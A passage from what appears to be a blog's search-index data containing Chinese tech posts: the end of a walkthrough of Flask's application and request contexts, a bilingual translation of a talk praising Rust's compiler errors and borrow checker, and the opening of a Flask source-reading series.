application-specific information. An app context is created and pushed at the beginning of each request if one is not already active. An app context is also pushed when running CLI commands.RequestContextThe request context contains per-request information. The Flask app creates and pushes it at the beginning of the request, then pops it at the end of the request. It will create the URL adapter and request object for the WSGI environment provided.Do not attempt to use this class directly, instead use ~flask.Flask.test_request_context and ~flask.Flask.request_context to create this object.When the request context is popped, it will evaluate all the functions registered on the application for teardown execution (~flask.Flask.teardown_request).The request context is automatically popped at the end of the request. When using the interactive debugger, the context will be restored so request is still accessible. Similarly, the test client can preserve the context after the request ends. However, teardown functions may already have closed some resources such as database connections.\n\n也就是说，Flask 中的上下文主要分为两类，AppContext 和 RequestContext，其中前者代表了应用级别的上下文，后者代表了请求级别的上下文。这两类上下文包含了六个全局变量，尽管我们目前还不理解这六个全局变量的具体功能（其实看变量名也能大概理解），但能够确定它们的实质是来自 WerkZeug 的 LocalProxy 类（见第 6 行）的实例。这是非常合理的，因为尽管 Flask 已经支持使用其它的 WSGI Server，但 Flask 仍是基于一个 WerkZeug 的 WSGI Application，直接使用 WerkZeug 提供的上下文实现作为自己的上下文实现确实是一件非常自然的事\n\n这两级上下文的概念在 Flask 的文档说明 中有着详细的解释，在此就不过多赘述。\n\n线程上下文与 WerkZeug 上下文的实现阅读了 globals.py 中的代码后不难看出，为了理解 Flask 上下文的实现，我们的下一个目标就是探索 LocalProxy 这个类。但在此之前，我们需要先从线程上下文的实现方式谈起。为了避免不同线程共用同一上下文时产生竞争或未定义行为，程序往往需要实现一个能够线程隔离的上下文。一个容易想到的实现方式是，使用一个字典存储本线程的上下文，再使用一个以各个线程的线程 ID 为键，以该线程 ID 对应的线程的上下文作为值的字典来存储所有线程的上下文。这样，每个线程只需要以自己的线程 ID 为索引，便可以分别从同一全局变量中访问自己的上下文，且不同线程的上下文彼此隔离。\nimport threadingclass ThreadLocal(object):    def __init__(self):        # self.storage = &#123;&#125;        object.__setattr__(self,&quot;storage&quot;,&#123;&#125;)    def __setattr__(self, key, value):        ident = threading.get_ident()        self.storage.setdefault(ident,&#123;&#125;)[key] = value    def __getattr__(self,item):        ident = threading.get_ident()        if ident not in self.storage:            return        return self.storage[ident].get(item)        \n\n这是一个较为简单的基于嵌套线程上下文的实现，其中每一个线程的上下文都是独立的。这一点可以借由下列 POC 验证\nlocal = ThreadLocal()def task(arg):    local.key = arg    print(local.key)task_list = []for i in range(7):    t = threading.Thread(target=task(i))    t.start()    task_list.append(t)for t in task_list:    t.join()\n\n它的输出应该是\n0123456\n\n实际上，Python 内置的 ThreadLocal 就是以类似的方式实现的，它可以通过 threading.local() 获取。而 WerkZeug 并没有直接使用 threading.local，而是自行实现了略有区别的 werkzeug.local.Local 类，还实现了 LocalStack 和 LocalProxy 这两种新的数据结构。Local 类与我们的 ThreadLocal 一样使用了一个字典来保存本线程的上下文以提供属性访问，而 LocalStack 则是使用了一个栈来保存本线程上下文以提供栈访问，除此以外大同小异。LocalProxy 类主要用于代理它的 Local 对象或 LocalStack 对象，负责把所有对自己的操作转发给内部的 Local 对象或 LocalStack 对象。其实现方式不在本文的讨论范围之内，故在此不再深究。\nFlask 主要通过 LocalProxy 来操作 LocalStack 以存储上下文对象，其目的在于兼容多 application 的使用情况。当多个 Flask Application 同时运行时，当前应用的上下文需要动态更新，而使用栈存储上下文可以确保当前运行的上下文的准确\nFlask 上下文的管理在RE:从0开始阅读Flask源码 Ⅱ中我们已经了解了 Flask 请求-响应循环的工作流程，而在这一流程的第一步，WSGI Server 调用 WSGI Application 时，我们便已经能够看到上下文的身影\n# app.pydef request_context(self, environ: WSGIEnvironment) -&gt; RequestContext:    &quot;&quot;&quot;Create a :class:`~flask.ctx.RequestContext` representing a    WSGI environment. Use a ``with`` block to push the context,    which will make :data:`request` point at this request.    See :doc:`/reqcontext`.    Typically you should not call this from your own code. A request    context is automatically pushed by the :meth:`wsgi_app` when    handling a request. Use :meth:`test_request_context` to create    an environment and context instead of this method.    :param environ: a WSGI environment    &quot;&quot;&quot;    return RequestContext(self, environ)def wsgi_app(    self, environ: WSGIEnvironment, start_response: StartResponse) -&gt; cabc.Iterable[bytes]:    ctx = self.request_context(environ)    ...    try:        try:            ctx.push()            ...        except Exception as e:            ...        ...    finally:        ...        ctx.pop(error)\n\nWSGI Server 每次在调用 Flask 对象的 __call__ 方法时，都会将对应的请求信息入栈，并在请求处理完毕后将其出栈。入栈时，这一请求信息通过 request_context 方法，即通过 RequestContext 的构造方法被封装为一个 RequestContext 对象\n# ctx.pyclass RequestContext:    &quot;&quot;&quot;The request context contains per-request information. The Flask    app creates and pushes it at the beginning of the request, then pops    it at the end of the request. It will create the URL adapter and    request object for the WSGI environment provided.    Do not attempt to use this class directly, instead use    :meth:`~flask.Flask.test_request_context` and    :meth:`~flask.Flask.request_context` to create this object.    When the request context is popped, it will evaluate all the    functions registered on the application for teardown execution    (:meth:`~flask.Flask.teardown_request`).    The request context is automatically popped at the end of the    request. When using the interactive debugger, the context will be    restored so ``request`` is still accessible. Similarly, the test    client can preserve the context after the request ends. However,    teardown functions may already have closed some resources such as    database connections.    &quot;&quot;&quot;    def __init__(        self,        app: Flask,        environ: WSGIEnvironment,        request: Request | None = None,        session: SessionMixin | None = None,    ) -&gt; None:        self.app = app        if request is None:            request = app.request_class(environ)            request.json_module = app.json        self.request: Request = request        self.url_adapter = None        try:            self.url_adapter = app.create_url_adapter(self.request)        except HTTPException as e:            self.request.routing_exception = e        self.flashes: list[tuple[str, str]] | None = None        self.session: SessionMixin | None = session        # Functions that should be executed after the request on the response        # object.  These will be called before the regular &quot;after_request&quot;        # functions.        self._after_request_functions: list[ft.AfterRequestCallable[t.Any]] = []        self._cv_tokens: list[            tuple[contextvars.Token[RequestContext], AppContext | None]        ] = []        ...    def match_request(self) -&gt; None:        &quot;&quot;&quot;Can be overridden by a subclass to hook into the matching        of the request.        &quot;&quot;&quot;        try:            result = self.url_adapter.match(return_rule=True)  # type: ignore            self.request.url_rule, self.request.view_args = result  # type: ignore        except HTTPException as e:            self.request.routing_exception = e    def push(self) -&gt; None:        # Before we push the request context we have to ensure that there        # is an application context.        app_ctx = _cv_app.get(None)        if app_ctx is None or app_ctx.app is not self.app:            app_ctx = self.app.app_context()            app_ctx.push()        else:            app_ctx = None        self._cv_tokens.append((_cv_request.set(self), app_ctx))        # Open the session at the moment that the request context is available.        # This allows a custom open_session method to use the request context.        # Only open a new session if this is the first time the request was        # pushed, otherwise stream_with_context loses the session.        if self.session is None:            session_interface = self.app.session_interface            self.session = session_interface.open_session(self.app, self.request)            if self.session is None:                self.session = session_interface.make_null_session(self.app)        # Match the request URL after loading the session, so that the        # session is available in custom URL converters.        if self.url_adapter is not None:            self.match_request()    def pop(self, exc: BaseException | None = _sentinel) -&gt; None:  # type: ignore        &quot;&quot;&quot;Pops the request context and unbinds it by doing that.  This will        also trigger the execution of functions registered by the        :meth:`~flask.Flask.teardown_request` decorator.        .. versionchanged:: 0.9           Added the `exc` argument.        &quot;&quot;&quot;        clear_request = len(self._cv_tokens) == 1        try:            if clear_request:                if exc is _sentinel:                    exc = sys.exc_info()[1]                self.app.do_teardown_request(exc)                request_close = getattr(self.request, &quot;close&quot;, None)                if request_close is not None:                    request_close()        finally:            ctx = _cv_request.get()            token, app_ctx = self._cv_tokens.pop()            _cv_request.reset(token)            # get rid of circular dependencies at the end of the request            # so that we don&#x27;t require the GC to be active.            if clear_request:                ctx.request.environ[&quot;werkzeug.request&quot;] = None            if app_ctx is not None:                app_ctx.pop(exc)            if ctx is not self:                raise AssertionError(                    f&quot;Popped wrong request context. (&#123;ctx!r&#125; instead of &#123;self!r&#125;)&quot;                )\n\n因此，Flask 上下文的管理逻辑实际上为，当收到请求时，创建当前进程&#x2F;线程的上下文对象（RequestContext 对象），上下文对象在被创建时，会将 WSGI Server 传递的 environ 参数封装为一个 Request 对象并存储到上下文对象的 request 成员中。然后，Flask 将调用上下文对象的 push 方法，将自身压入到请求上下文的堆栈中\n\n上下文对象除了保存了 request 外，还保存了另外一个重要的上下文 session 。与 request 不同的是，在请求上下文对象创建时会被设置为 None，在请求上下文被推入到请求上下文堆栈时才会被创建\n\n进一步观察 Flask 在创建上下文时的行为，尤其是这几行代码\n# app.py    app_ctx = _cv_app.get(None)    self._cv_tokens.append((_cv_request.set(self), app_ctx))    ctx = _cv_request.get()\n\n我们能从这些感到熟悉的行为中联想到线程上下文中类似的操作方式。结合 globals.py 中创建变量时的类型注解，会发现，_cv_app 和 _cv_request 实际上就是存储各线程的线程上下文的 LocalStack。而 app_ctx, current_app, g, request_ctx, request 和 session 这六个由 LocalProxy 的构造方法所创建的全局变量，实际上是类似于某种动态指针。它们所引用的对象由 LocalProxy 自动获取，当它们被使用时则是通过触发 LocalProxy 的魔术方法自行查找并返回\n因此，在理解了这些全局变量的实际作用后，Flask 的上下文管理方式就更加清晰了。在每次从 WSGI Server 接收请求时，Flask 创建当前进程&#x2F;线程需要处理的两个包含了对应上下文具体信息的上下文对象，并将它们 push 到线程隔离的栈中。当视图函数需要读取上下文进行响应处理时，则通过 LocalProxy 代理从栈中动态地获取上下文对象中保存的包含了对应信息的具体对象，并在处理结束后将上下文对象 pop 出栈清理内存\n总结让我引用一下flask工作原理与机制解析中的一段话作为这篇博客的结尾\n\nFlask中的上下文由表示请求上下文的 RequestContext 类实例和表示程序上下文的 AppContext 类实例组成。请求上下文对象存储在请求上下文堆栈中，程序上下文对象存储在程序上下文堆栈中。当一个请求发来的时候：1）需要保存请求相关的信息——有了请求上下文2）为了更好地分离程序的状态，应用起来更加灵活——有了程序上下文3）为了让上下文对象可以在全局动态访问，而不用显式地传入视图函数，同时确保线程安全——有了 Local（本地线程）4）为了支持多个程序——有了 LocalStack（本地堆栈）5）为了支持动态获取上下文对象——有了 LocalProxy（本地代理）6）……7）为了让这一切愉快的工作在一起——有了 Flask\n\nReferenceFlask RepoFlaskWerkZeugFlask 的 Context 机制flask工作原理与机制解析Flask Document about Application ContextFlask Document about Request Context\n","categories":["Tech Blog"]},{"title":"(译)(中英对照) Rust 让你觉得自己是个天才","url":"/2024/04/06/Tech%20Blog/Rust%E8%AE%A9%E4%BD%A0%E8%A7%89%E5%BE%97%E8%87%AA%E5%B7%B1%E6%98%AF%E4%B8%AA%E5%A4%A9%E6%89%8D/","content":"当我写 Rust 时，我觉得自己像个天才。我稍后会告诉你为什么，但首先看一个简单的问题，这段代码正确吗？\nWhen I write Rust , I feel like a genius . I’ll tell you why in a moment , but first a simple question . Is this code correct ?\n\n\nfunction add_one(n) &#123;    return n + 1;&#125;\n\nemm ， 看情况。如果你或你的同时想要确保该函数能够始终正常工作，就必须添加大量样板代码：检查 n 的类型，在它不是数字的时候报错；确保 n 的大小以避免某种溢出；n 是否是负数或浮点数？它是否是按值传递而非按引用传递？我们是否获取了保护 n 所在共享内存的锁？\nWell . It depends . If you or a colleague wanted to be totally sure this function could alway work , you’d have to add lots of boilerplate code :\n\nYou’d check the type of n , erroring if it wasn’t a number\nYou’d make sure n wasn’t so large that it caused some kind of overflow\nAnd what about negative numbers or floating point numbers\nPerhaps we’d ensure that n was passed by value not by reference or that we capture the lock on the part of shared memory that n was in\n\n当然，大多数语言针对其中许多都有着合理的默认行为，但当你编写代码时，能否把这些规则与边界情况都记住？我们只是想要在一个数字上加一，怎能期望面对包括但不限于以上不确定性时在大脑中维持着整个语言的预设？我们需要一个符号以简介地囊括它们。Rust 在其丰富的类型系统中提供了这种表示方式，我们稍后再看。\nSure , most languages have sensible defaults for many of these , but do you have all these rules and edge cases in your memory as you’re writing code ? All this uncertainly and we just added one to a number . How can we hope to keep a whole language’s assumptions all in our heads ? We need a notation to concisely encapsulate all this . Rust provides this notation in the rich type system . We’ll look at it in a moment .\n众所周知， Rust 在 Stack OverFlow 的开发者最喜爱语言榜单中连续六年登顶。我认为编译器的反馈正是写 Rust 时的满足感的奥秘所在。这让我觉得自己是天才，我的代码可以一在生产环境中运行就正常工作！在告诉你为什么 Rust 让你觉得自己是个天才之前，让我向你展示其它语言是如何通过迫使你进入到被我称作“错误驱动”开发方式来让你感到笨拙的。\nAs many of you know , Rust has topped the Stack Overflow developer survey for most loved language 6 years in a row . Compiler feedback is the secret to the satisfaction of writing Rust , I think . It makes me feel like a genius . My code works first time when I run it on production . Before i tell you why Rust makes you feel like a genius , let me show you how other languages makes you feel stupid by forcing you into what I’ll call Error Driven Development .\nlet spam = [&#x27;cat&#x27;,&#x27;dog&#x27;,&#x27;mouse&#x27;]console.log(spam[6])// no output,no errors, spam[6] is `undefined`\n\n最糟糕的情况是没有报错。你运行了代码，而它没如你所愿地工作，也没报错。你不得不坐在那想到底是为什么你没得到错误信息。毕竟 JavaScript 肯定不会报告给你。如果没有注解，即使是 TypeScript 也无法帮到你\nThe worst case is no errors . You run the code and it doesn’t do what you want , but there are also no errors . You just have to sit there and imagine why on earth you can’t get your error ! Because JavaScript certainly not going to tell you . Without annotations , even TypeScript can’t help you either .\n与没有报错相比，糟糕的报错也会好上很多。让我们看看 Python 是如何处理的\nMuch better than no errors are bad errors . Let’s look at how Python handles this .\nspam = [&#x27;cat&#x27;,&#x27;dog&#x27;,&#x27;mouse&#x27;]print(spam[6])\n\nPython error trace-back\nTraceback (most recent call last):  File &quot;test.py&quot;, line 2, in &lt;module&gt;    print(spam[6])          ~~~~^^^IndexError: list index out of range\n\n结果没有你想的那么棒，Python 没有告诉我这里到底有什么问题，只是给了一些信息。这是大多数语言的典型特征。当然，只要你知道需要查找什么，是可以知道错误是 list 的索引超出了其上限。但这里有很多不足，哪个 list ，什么上限，第二行的哪个具体位置。动态类型语言的错误通常不怎么理想，这并不必然是因为编译器的作者在它身上下功夫，他们已经尽力而为了。如果你的类型系统是简单的，编译器显然不可能为你捕获那么多的错误。顺便一提，Python 看似发现了这个错误，但它没有。这个错误发生在运行时，已经被用户除法。在你运气好的时候，你的测试可能能够捕获到它\nNot as well as you might think , it turns out : Python won’t tell me exactly what’s wrong here . It’s only giving me some of the information . And this is typical with most languages . Sure , once you know what to look for you can see that a list index is out of bounds . But there’s so much missing here . Which list , what bound , where even in line 2 is it ? Errors in dynamically typed languages are usually bad . And it’s not necessarily because the compiler authors didn’t put in the work . They’re doing the best they can . If you have a simple type system , the compiler simply can’t catch many errors for you . By the way , it might look like python has caught this error , but it actually didn’t . Look again . This error happened at runtime . Your user has caught this error . If you’re lucky , your tests might catch this error .\n\n截止至今日，Python 对其错误提示进行了一定的改进，在原作者编写本文文案时，Python 还不会在错误部分下方添加 ~ ^ 等符号进行标记\n\n这，是报错应有的样子\nHere is hwo it should be .\nlet spam = [&quot;cat&quot; , &quot;dog&quot; , &quot;mouse&quot;];println!(&quot;&#123;&#125;&quot;,spam[6]);\n\nRust trace-back error\nerror: this operation will panic at runtime --&gt; src/main.rs:2:19  |2 |     println!(&quot;&#123;&#125;&quot;,spam[6]);  |                   ^^^^^^^ index out of bounds: the length is 3 but the index is 6  |  = note: `#[deny(unconditional_panic)]` on by default\n\nRust 的报错是我所见过的最漂亮的。看看它，有错误本身，值是什么，本不应超过 3 而实际上是 6 。我们不需要去记忆值是什么，编译器已经告诉了我们。Rust 的报错发生在编译时(广义的，即发生在开发者的开发环境中而非生产环境中)\nRust’s error are the nicest I’ve ever seen . Just look at it : We have the error itself . What the value should be , no more than 3 , and what value actually was , 6 . We don’t have to remember wht the value is , the compiler has told us . Rust’s errors happen at compile time , which is a fancy way of saying they must happen on the developers machine , not on a server somewhere .\n让我们再深入一些，比如说我想要在某个循环中打印某个数字以便调试\nLet’s get a little deeper . Say I want to print out a number inside a loop for debugging purpose .\nerror: format argument must be a string literal  --&gt; src/main.rs:10:14   |10 |     println!(n);   |              ^   |help: you might be missing a string literal to format with   |10 |     println!(&quot;&#123;&#125;&quot;, n);   |              +++++\n\n但是，噢，就像在 C 语言中一样，数字需要一个格式化字符串才能打印出来。看看这个报错信息！你见过这么漂亮的东西吗？它不仅以易懂的语言告诉了我们问题是什么，还直观地指出了问题的确切位置，甚至还给出了修正它的建议！我想这就是为什么 Rust 被评为最受欢迎的语言。编译器就像一位驾校教练一样，慷慨地教导你如何在危险的公路上行驶。这一简单例子所展现出来的仍不是 Rust 的全部。它会以这样的方式手把手地帮助你安全驶过异步网络编程，多进程，channel 和锁。所有这些都能通过 Rust 的宏系统为所有人所用。第三方网络库与框架也提供了这般丰富的报错功能。慷慨、善良、周到的 Rust 开发者们告诉我们，那个很危险，用这个吧。\nBut whoops , like in C , numbers need a format string to be printed . Just look at this error message . Have you ever seen something so beautiful ? It’s not only telling us the error in plain language , but visually pointing to exactly where the problem is , and then suggests what we should do to fix it ! I think this is why Rust has been voted most loved language . The compiler is like a driving instructor , gently coaching you on how to navigate the dangerous highway . This is another simple example , but the Rust compiler holds your hand in this way right through async network programing , multi-processing and through channels and locks and all this is available to anyone via the macro system , so that third party web libraries and frameworks have these rich error , too . The generous , kind , thoughtful Rust developers told us that it’s dangerous out there , take this .\nRust 团队解决了我们在 C 中所面临的最困难的问题，即如何确保内存安全。他们采用了稍后会提到的“借用检查器”这一最坚决的方式解决了最困难的问题，而非用垃圾收集器作弊或留给开发者解决。通过与这种新的方式结合，这一解决方案能够轻易解决所有剩余问题。如果你要创造一个能详尽了解你的程序的内存的编译器，就必须先创造一个能完全理解你的代码的编译器。Rust 并不是什么只会在大学或只会被 Rust 黑魔法师使用的理论上的语言，它已经有了所有能够避免你犯错并在你违反规则时帮助你而应有的组件\nThe Rust team set out to solve the most difficult problem we face , in C , which is how to handle memory safely . They fixed it with the Borrow Checker , which I’ll explain in a moment . Because they solved the most difficult problem in the hard way , not cheating with a garbage collector or leaving it up to developer , it was easy to use this solution to solve all the other problems , by hooking into this new way of programming . If you make a compiler that understands your program’s memory exhaustively , then you have to made a compiler that understands your code exhaustively . And Rust isn’t some theoretical language that is only used in university or by esoteric wizards . All the components are already here today to make a language that stops you making mistakes , and helps you if you break the rules .\n我已经尽我所能地不提借用检查器了。不过好消息是它非常简单。并有着神奇的作用。借用检查器有两条规则\nI’ve talked as long as I can without telling you about the Borrow Checker . The good news is that it’s extremely simple . It’s the effects that are profound . The Borrow Checker has two rules:\n\n数据有一个所有者 Data has one owner\n数据可以被多个对象读取或被一个对象修改 Data may have multiple readers or one writer\n\n这就完了。这就是借用检查器的两条规则，它的所有行为都可以被这两条规则所解释。你可以把数据看作是一个变量，不过它实际上是变量所指向的目标\nThat’s it . Those are the two rules of the borrow checker . All behavior can be explained by these two . You can think of data as a variable , though it’s really the data that variable points to .\n…\n\n这里略去的是原作者对 Rust 的 Borrow Checker 机制的介绍，也就是针对所有权机制和引用机制的例子及其说明，实际上针对下面的讨论，理解此处列出的两条，即 Rust 中的数据自带 S 锁与 X 锁即可\n\n这就是所有权与借用机制的底层工作方式。该系统被设计用于跟踪内存，并在不再使用时将其释放。但你可以基于这一系统为你的程序设计更复杂的不变性。让我们看一个实际的，由这一简单系统所产生的在较高层次上产生影响的例子\nThis is how ownership and borrowing work at a very low level . This system was designed to keep track of memory , and to be able to free it when it is no longer used . But you can use this system to design much more complex invariants for your programs ! Let’s look at a practical , high-level example of the repercussions of this simple system .\n\nDo not communicate by sharing memory;instead , share memory by communicating—— Effective Go\n\nGo 团队为他们的语言采取了非常棒的设计，这是处理共享内存的正确方式，但他们没有真的阻止你共享内存，这就导致了问题。Rust 的所有权机制让我们可以轻易地把这一建议变成编译器检查的规则。在你理解了所有权之后，可以读一读这个\nIt’s really nice that the Go team designed their language this way . It’s the right way to handle shared memory . But they don’t stop you sharing memory , which leads to problems . Rust’s ownership made it easy to turn this recommendation into a compiler-checked rule . Now you understand ownership , I think you can read this .\n// Suppose channel: Channel&lt;Vec&lt;String&gt;&gt;let mut uers = Vec::new();// do some computation , maybe append some usernameschannel.send(users);print_vec(&amp;users);\n\nResults in:\nError: use of moved value `vec`\n\n我们创建了一个用户列表，并通过通道将其发送到了其它线程、进程或机器上。在我们发送之后，没人知道那里的数据会发生什么，哪怕是读取它都会是不安全的。尽管借用检查器本是为了保持内存安全而创建的，但它仍可以简单地用于创建编译时检查以确保安全的通道。接收数据的线程可能在这第一个线程运行的同时就修改它，所以 print_vec 处可能存在条件竞争。这种使用已被释放内存的 BUG 不需要进行测试就能够编译器发现并不让编译通过。在 Rust 社区，我们称之为无畏并发\nWe’ve created a list of users , and sent it down a channel to some other thread or process or machine . After we’ve sent it , who knows what will happen to the data in there . It is unsafe to even read the user list after we’ve sent it . The borrow checker , despite being created to keep memory safe , can be used trivially to create compile-time-checked guaranteed safe channels . The thread receiving users could modify it as this first thread continues running , so the call to print_vec could lead to race condition , or , for that matter , a use-after-free bug . You don’t even need to test this code to find these race conditions . The Rust compiler won’t let you compile . In the Rust community , we call this Fearless Concurrency .\n在 Rust 中，Option 枚举类型无处不在，就像人生中你无法心想事成那样\nIn Rust , Options are everywhere . Because , as in life , you can’t always get what you want .\nWAYS TO TEST NULL IN JS\ntypeof null           // Objecttypeof undefined      // undefinednull === undefined    // falsenull == undefined     // truenull === null         // truenull == null          // true!null                 // trueisNan(l + null)       // falseisNan(l + undefined)  // true\n\nWho is flying this thing ?\n很难有人能记住 JS 这些复杂而残酷的判断 NULL 的方式。别让你的人生也这样。显然，除非我们需要一个函数不返回任何内容，不然 null 一直都是一个令人头疼的问题\nNo one remembers all this . It’s byzantine and cruel . Your life doesn’t have to be this way . Everyone agrees that nulls are bad until it’s time to return nothing from a function .\n\nNULL 的发明者痛恨甚至忏悔自己发明了 NULL ，但这一重要概念又不得不使用。NULL 相关的处理一直都是一件令人头疼的事，除非你用 Rust :P\n\nenum Option&lt;T&gt; &#123; // T can contain any type of value   Some(T),   None&#125;let possibly_a_number = Some(l);possibly_a_number.map(|n| n + 1).unwrap_or(0); // 2\n\n将一个类型包裹在 Option 中清楚地向程序员，IDE 和编译器表明一个值可能为空，不是可能为 0 或空字符串，就是什么都没有。表示什么都没有的这个概念有着很大的用处。Rust 会要求你处理它。同时，在 Rust 中，就像 Option 是 null 的解决方案，Result 是 error 的解决方案。在 Rust 中，error 是值。你可能在其它语言中也见到过这种情况，例如在 Go 中\nWrapping a type in an Option signifies clearly to the programmer , the IDE , and the compiler , that this value might be something , or it might be nothing . It’s not that it’s zero or an empty string , it might just be nothing . Nothing , the value is useful , and the Rust compiler will force you to deal with it . Just as options transform nulls in Rust , Results transform errors . In Rust , errors are values . You might have seen this in other languages , like here , in Go .\nf , err := os.Open(&quot;filename.ext&quot;)if err != nil &#123;   log.Fatal(err)&#125;\n\n这里的 err 就包含了错误，你必须在访问 f 前检查它。但 Go 没有阻止你忽略这个错误，事实上它总是被忽略 ( err 的位置被写成 _ ) 。Rust 在 Result 枚举类型中对其进行了捕获，这样编译器就能强制你去处理错误。\nHere err contains the error , and you must check it before accessing f . But there’s nothing stopping you ignoring the error , in fact this happens all the time . Rust captures this pattern in the Result type , so that the compiler can force you to handle the error .\n以上提到的内容没有运行时的开销(我们称之为零成本抽象，例如下文给出的例子)。丰富的类型层次不会被植入到用户的电脑中。这个可选函数链完美地展开到没有错误的安全的值的过程不会运行在用户的手机上。甚至借用检查其在你把它编译到 WebAssembly 中运行的 GPU 加速的 DOOM 副本中时，也不会将自己在指令中写出来\nNearly all of this that I’ve shown you doesn’t exist at run time . Your rich type hierarchy doesn’t sneak no to your customers laptop . The chain of optional functions resolving down nicely into a safe value with no errors doesn’t run on your user’s phone . Even the borrow checker writes itself out of the code as you compile it into your gpu-accelerated doom clone running in web assembly .\nRust 惊人的丰富性和复杂性只存在于编译时，在你通过这些手段告诉编译器世界的运行方式之后，编译器会详尽地证实没有任何东西能违背你写进代码中的约束。如果一切顺利无误，所有这些信息都会在被编译成低级别地汇编时从代码中剥离掉。运行时不存在类型的概念，正如实际的程序执行时那样。我们发明了类型，它们就像逻辑严明的文学作品，只存在于我们的脑海中而非现实里。CPU 不知道什么是类型，只知道二进制数据与运算符。下面的两个代码块都会编译为相同的汇编指令\nRust’s incredible richness and complexity only exists at compile time , after you have told the compiler how the world works by notating your code with all this markup , the compiler exhaustively proves that nothing could violate the contracts you have put into code . If everything checks out , all this information is stripped out of the code as it is compiled into low-level assembly . Types don’t exist at runtime . And this is actually the way the world works . We invented types . They’re like a logical fiction . They only exist in our minds . CPUs don’t know anything about types . They only know 1s and 0s and a few operators . Both of these two code blocks compile down to exactly the same assembly .\npub fn sum_loops(n: i32) -&gt; i32 &#123;   let mut sum = 0;   for i in 1..n &#123;      sum += i;   &#125;   sum&#125;\n\nIS EQUIVILANT TO\npub fn sum_iterators(n: i32) -&gt; i32 &#123;   (1..n).sum()&#125;\n\ncompile down to\nsum:   xor   eax , eax   cmp   edi , 2   jl    .LBB0_2   lea   eax , [rdi - 2]   lea   ecx , [rdi - 3]   imul  rcx , rax   shr   rcx   lea   eax , [rcx + 2*rdi]   add   eax , -3.LBB0_2:   ret\n\n在 Rust 中，只要你肯手动优化，你的代码可以变得更高级也更快。Rust 编译器会自动为我们验证包括但不限于这些内容：\nYour code can be both HIGHER LEVEL and FASTER in rust than it could if you had hand-optimized it . Here is a non-exhaustive selection of some of the things the Rust compiler can validate for us for free .\n\n所有的 AWS All of AWS\n所有的 Windows API All of the MS Windows API\nWASM WebAssembly\n迭代器，Option 与 Result 枚举类型 Iterators,Options and Results\n内存安全 Memory safety\n\n在我的上一个视频中我告诉过你，在 Rust 中，你向编译器描述这个世界是如何运作的，然后它会让你对其中的约束负责。丰富的类型系统就是你书写约束的方式，建立在借用检查器之上的编译器让你对其负责。这都意味着你一部署你的代码，它可以完美的工作，这让你感觉自己是个天才\nIn my last video I told you that in Rust , you tell the compiler how the world works , and it will hold you and everyone who contributes to your code accountable to the contract you have written . The rich type system is how you write the contract , the compiler built on the borrow checker then holds you to it . This all means your code works perfectly , the first time you deploy it , and makes you feel like a genius .\nReferenceRust makes you feel like a GENIUS\n","categories":["Tech Blog"]},{"title":"RE:从0开始阅读Flask源码 Ⅰ","url":"/2024/04/04/Tech%20Blog/RE-%E4%BB%8E0%E5%BC%80%E5%A7%8B%E9%98%85%E8%AF%BBFlask%E6%BA%90%E7%A0%81/","content":"简单解读 Flask 的源代码以了解 Flask 与类 Flask 框架中相关功能的具体实现，设计模式和代码组织方式\nFlask 框架的源代码写的非常简洁，例如 Flask 最早发行的 0.1 版本只包含了核心脚本 flask.py , 不考虑空行代码量仅 400 余行，故比较容易阅读与理解。不过 Flask 各个模块联系紧密，线性的阅读方式可能比较难以达成理想的阅读效果，因此本博客系列决定从一些功能切入，自顶向下地解读 Flask 的核心源代码，了解具体的实现方法，再掌握 Flask 框架的整体结构，最后在理想的条件下融汇贯通完整理解 Flask 框架的设计，真是一次酣畅淋漓的源代码阅读之旅啊！\nFlask，启动！\n\nFlask 简介Python Flask 是一个知名的轻量级的 Web 应用框架，由 Armin Ronacher 开发于2010年。它的设计理念是简洁而灵活，旨在帮助开发者快速构建 Web 应用程序。Flask 基于 Werkzeug WSGI 工具箱和 Jinja2 模板引擎，同时也受到了 Django 框架的启发\nFlask 的核心功能包括路由分发、模板渲染、表单处理、会话管理等，同时还提供了丰富的扩展库，如 Flask-SQLAlchemy、Flask-RESTful、Flask-Login 等，使开发者能够根据需要灵活地扩展功能\n其特色之一是简单易学，由于其简洁的设计和清晰的文档，使得新手可以迅速上手。此外，Flask 的扩展生态系统非常丰富，提供了大量的第三方扩展库，满足了各种不同需求，并以其简洁、灵活和易扩展的特点，成为了开发 Web 应用的理想选择，尤其适合小型和中型项目的开发\n准备工作使用 pip 或你的系统包管理器安装 Flask 以便进行调试，下以 Arch Linux 的 pacman 为例\npacman -Syu python-flask\n\n使用 git 下载 Flask 的源代码\ngit clone https://github.com/pallets/flask.git\n\nFlask 框架截止至 2024.4.1 ( V3.02 ) 的源代码的目录结构应该是\nflask├── app.py├── blueprints.py├── cli.py├── config.py├── ctx.py├── debughelpers.py├── globals.py├── helpers.py├── __init__.py├── json│   ├── __init__.py│   ├── provider.py│   └── tag.py├── logging.py├── __main__.py├── py.typed├── sansio│   ├── app.py│   ├── blueprints.py│   ├── README.md│   └── scaffold.py├── sessions.py├── signals.py├── templating.py├── testing.py├── typing.py├── views.py└── wrappers.py\n\n在你喜欢的 IDE 或文本编辑器中打开它，准备完毕\nFlask Demo下面是 Flask 框架官方给出的 Demo\nfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    return &quot;HelloWorld&quot;if __name__ == &quot;__main__&quot;:    app.run()\n\n阅读这段代码，可以看出它首先从 flask 模块中引入了 Flask ，根据 Python 的命名规范可以判断它应该是一个对象。接着，该程序以 __name__ 为参数构造了一个 Flask 对象实例并命名为 app。随后使用了 app 内的 route 装饰器，以 &#x2F; 作为参数装饰了函数 index，这个函数会返回字符串字面值 HelloWorld 。然后，如果当前程序是被 Python 直接执行而非被导入的，就调用 app 实例的 run 方法。它的运行效果是在本机的 5000 端口创建了一个 WebServer 。访问 URL localhost:5000&#x2F; 我们会收到 “HelloWorld” 字符串作为返回\n不难看出，这段代码工作的核心，也是理解 Flask 框架工作原理的核心，就在我们引入的 Flask 类上，让我们查看 Flask 类的源代码，看看这个类是如何被实现的\nFlask 框架原理初探WerkZeug WSGI 框架初探在执行 Flask 使用实例代码时，实际启动这个项目的代码是 app.run()，也即是说，启动 WebServer 的代码一定在 Flask 类的 run 方法里。不过，在具体说明 Flask 类的工作方式之前，我们先需要通过一段代码了解一下 Flask 的依赖 WerkZeug 。\nfrom werkzeug.serving import run_simpledef hello(environ, start_response):    print(&quot;HelloWorld&quot;)if __name__ == &quot;__main__&quot;:    run_simple(&quot;127.0.0.1&quot;, 5000, hello)\n\n运行这段代码，会发现它也在本地 5000 端口启动了一个 WebServer ，当我们访问这个 WebServer 时会得到一个 500 Internal Server Error ，同时在服务端输出了 Hello ，也就是 